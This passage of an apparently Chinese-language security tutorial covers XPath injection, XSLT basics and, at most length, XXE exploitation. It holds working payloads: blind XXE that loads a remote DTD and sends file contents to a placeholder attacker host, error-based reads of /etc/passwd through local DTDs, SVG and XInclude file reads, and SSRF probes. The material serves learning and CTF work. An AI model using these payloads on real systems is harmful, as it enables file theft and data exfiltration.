class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/xml/</span><span class="hljs-number">2</span>.php?name=<span class="hljs-string">&#x27; or substring(name(/root/*[position() = 1]),1,1)=&#x27;</span><span class="hljs-string">u&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/xml/</span><span class="hljs-number">2</span>.php?name=<span class="hljs-string">&#x27; or substring(name(/root/*[position() = 1]),2,1)=&#x27;</span>s<span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>最终结果:users</p><p>重复上述步骤，直至猜解出所有节点，最后来猜解节点中的数据或属性值。</p><h3 id="Xpath注入攻击危害及防御"><a href="#Xpath注入攻击危害及防御" class="headerlink" title="Xpath注入攻击危害及防御"></a>Xpath注入攻击危害及防御</h3><p>危害：</p><ul><li>在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据。</li><li>可通过此类漏洞查询获取到系统内部完整的XML文档内容。</li><li>逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。</li></ul><p>防御：</p><ol><li>数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。</li><li>检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串。</li><li>对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息。</li><li>参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。</li><li>通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。</li></ol><h2 id="XSLT注入"><a href="#XSLT注入" class="headerlink" title="XSLT注入"></a>XSLT注入</h2><h3 id="什么是XSLT？"><a href="#什么是XSLT？" class="headerlink" title="什么是XSLT？"></a>什么是XSLT？</h3><p>XSLT 是XSL中最重要的部分，专门用于将XML文档转换为其他格式（如HTML、纯文本或其他XML格式）。实际就是给XML美化生成其他文档的东西。</p><p>XSLT常见用途是传输不同应用生成的文件数据和作为模版引擎。许多企业型应用程序广泛使用XSLT。比如，多租户开票应用程序可以允许客户端使用XSLT大量定制其发票。客户可以根据具体需要更改发票中显示的信息及其格式。</p><p>其他常见的应用：</p><ul><li>报表功能</li><li>不同格式的数据导出</li><li>打印</li><li>邮件</li></ul><p>XSLT语法可参考：<a href="https://www.runoob.com/xsl/xsl-tutorial.html">https://www.runoob.com/xsl/xsl-tutorial.html</a></p><p>在描述这类攻击前，让我们通过一个实际例子来看看转换是如何进行的。</p><p>首先是下面这样的XML文件，包含了水果名和相关描述的列表：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">fruits</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">fruit</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Lemon<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Yellow and sour<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">fruit</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">fruit</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Watermelon<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Round, green outside, red inside<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">fruit</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">fruits</span>&gt;</span><br></code></pre></td></tr></table></figure><p>为了将XML文档转为纯文本，使用如下XSL转换：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/fruits&quot;</span>&gt;</span><br>    Fruits:<br>    <span class="hljs-comment">&lt;!-- Loop for each fruit --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:for-each</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;fruit&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- Print name: description --&gt;</span><br>      - <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;name&quot;</span>/&gt;</span>: <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;description&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:for-each</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用上述转换规则对数据进行转换的结果是下面的纯文本文件：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Fruits</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">Lemon: Yellow and sour</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">Watermelon: Round, green outside, red inside</span><br></code></pre></td></tr></table></figure><h3 id="XSLT注入的发现与利用"><a href="#XSLT注入的发现与利用" class="headerlink" title="XSLT注入的发现与利用"></a>XSLT注入的发现与利用</h3><p>参考：<a href="https://xz.aliyun.com/news/24">https://xz.aliyun.com/news/24</a></p><p>下面我们重点讲一下XXE</p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h2><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。</p><p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p>解析xml在php库libxml，libxml&gt;&#x3D;2.9.0的版本中没有XXE漏洞。<a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>可以读取XML</p><h2 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D://1.txt&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h3><h4 id="加载远程DTD"><a href="#加载远程DTD" class="headerlink" title="加载远程DTD"></a><strong>加载远程DTD</strong></h4><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">payload:</span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span>[</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xx.xx.xx.xx:8000/blindxxe1.xml&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%dtd</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%send</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">blindxxe1.xml文件内容为</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payload</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xx.xx.xx.xx:8000/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</span><br><span class="language-xml">//%实体编码成&amp;#x25</span><br></code></pre></td></tr></table></figure><p>先 %dtd 请求远程服务器（攻击机）上的 evil.xml，然后 %payload 调用了 %file ，%file 获取对方服务器上的敏感文件，最后替换 %send，数据被发送到我们远程的服务器，就实现了数据的外带</p><p>还有一种模板</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">payload:</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xx.xx.xx.xx:8000/blindxxe2.xml&quot;</span>&gt;</span> </span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%dtd</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%all</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%send</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span> </span><br><span class="language-xml"></span><br><span class="language-xml">blindxxe2.xml文件内容为</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xx.xx.xx.xx:8000/?content=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>当然，我们也可以用DNSlog去判断有无XXE漏洞，但只能判断，感觉不能读文件（用处不大）</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://aaabbb.fiaz84.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">  <span class="hljs-variable">%remote</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="加载本地DTD"><a href="#加载本地DTD" class="headerlink" title="加载本地DTD"></a><strong>加载本地DTD</strong></h4><p>如果目标有防火墙等设备，阻止了对外连接，可以采用基于错误回显的XXE。这种方式最流行的一种就是加载本地的DTD文件。</p><p>这个过程与先前引⽤远程 DTD 实现 Error-based XXE 的过程类似, 只不过将远程 DTD 转换成了本地 DTD</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">messege</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///opt/IBM/Websphere/AppServer/properties/sip-app10.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span><span class="hljs-string">&#x27;aaa)&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &lt;!ENTITY &amp;#x25;file SYSTEM &quot;file:///etc/passwd&quot;&gt;SYSTEM &amp;#x27;&lt;!ENTITY &amp;#x25; eval &quot; </span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &amp;#x25;eval;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &amp;#x25;error;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &lt;!ENTITY aa (bb&#x27;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">  <span class="hljs-variable">%local_dtd</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>any text<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><code>/opt/IBM/Websphere/AppServer/properties/sip-app10.dtd</code>是websphere上默认存在的dtd，可以通过加载它触发报错返回读取文件的内容。</p><p>在部分 Linux 系统上, 默认已经包含了⼀些 DTD ⽂件, 我们可以通过 Errorbased XXE 结合本地的这些 DTD ⽂件, 实现在不出⽹的情况下拿到回显</p><p>如下面两种payload：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/local/app/schema.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">custom_entity</span> <span class="hljs-string">&#x27;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&amp;#x25;eval;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&amp;#x25;error;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&#x27;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%local_dtd</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamsa</span> <span class="hljs-string">&#x27;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&amp;#x25;eval;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&#x27;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%local_dtd</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>这段payload有点长，我们一点点来讲，这里burp直接介绍了一个内部的DTD：&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd，这个内部DTD中有一个参数实体叫custom_entity，然后我们重写了这个参数实体，这里有个小知识点，在参数实体内部声明参数实体时关键字需要使用它的html编码格式，比如</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#x26; -&gt; &amp;<br>&amp;#x27; -&gt; <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>其他的和前面利用报错信息的XXE盲打方式是一样的。这种复用本地DTD的攻击方式重点在于我们能不能找到一个这样的本地DTD，现在很多应用程序都是开源的，所以我们可以下载源码包进行查找。</p><h4 id="报错信息利用XXE泄露数据"><a href="#报错信息利用XXE泄露数据" class="headerlink" title="报错信息利用XXE泄露数据"></a><strong>报错信息利用XXE泄露数据</strong></h4><p>有的时候我们可以通过触发XML解析错误将敏感信息泄漏在报错信息中，例如</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">payload:</span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xx.xx.xx.xx:8000/errorxxe.xml&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%remote</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">errorxxe.xml文件内容为</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%eval</span>;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%error</span>;</span><br></code></pre></td></tr></table></figure><p>从上面我们能看到加载了一个不存在的文件触发XML报错，但是后面加载的file实体指定的文件是存在的，所以XML报错信息中就能泄漏这个文件的内容了</p><h3 id="svg-XXE"><a href="#svg-XXE" class="headerlink" title="svg XXE"></a>svg XXE</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>除了 PHP 的 libxml 以外, Python 的⼀些第三⽅库也会存在 XXE 的问题, 例如 svglib </p><p>⾸先了解下 SVG, SVG 格式使⽤ XML 来存储⽮量图形, 那么⾃然 SVG 也会和 XML ⼀样⽀持外部实体这个功能, 也就有可能会存在 XXE </p><p>svglib 是⼀个处理 SVG ⽂件的 Python 第三⽅库, 它在 0.9.4 版本以前默认会解析 SVG 中的外部实体, 即存在 XXE</p><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;foo xmlns:<span class="hljs-attribute">xi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;<br>&lt;xi:include <span class="hljs-attribute">parse</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>/&gt;&lt;/foo&gt;<br></code></pre></td></tr></table></figure><h3 id="XXE打SSRF"><a href="#XXE打SSRF" class="headerlink" title="XXE打SSRF"></a>XXE打SSRF</h3><p>SSRF的触发点通常是在ENTITY实体中，可以用来探测内网端口与攻击内网网站</p><p>paylaod：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ssrf</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip:port&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">    <span class="hljs-variable">%ssrf</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="修改Content-Type"><a href="#修改Content-Type" class="headerlink" title="修改Content-Type"></a>修改Content-Type</h3><p>大部分的POST请求的Content-Type都是表单类型<code>application/x-www-form-urlencoded</code>，但是有的应用程序允许将其修改成<code>text/xml</code>，这样我们就可以将报文内容替换成XML格式的内容了，例如</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/action</span> <span class="hljs-meta">HTTP/1.0</span><br><span 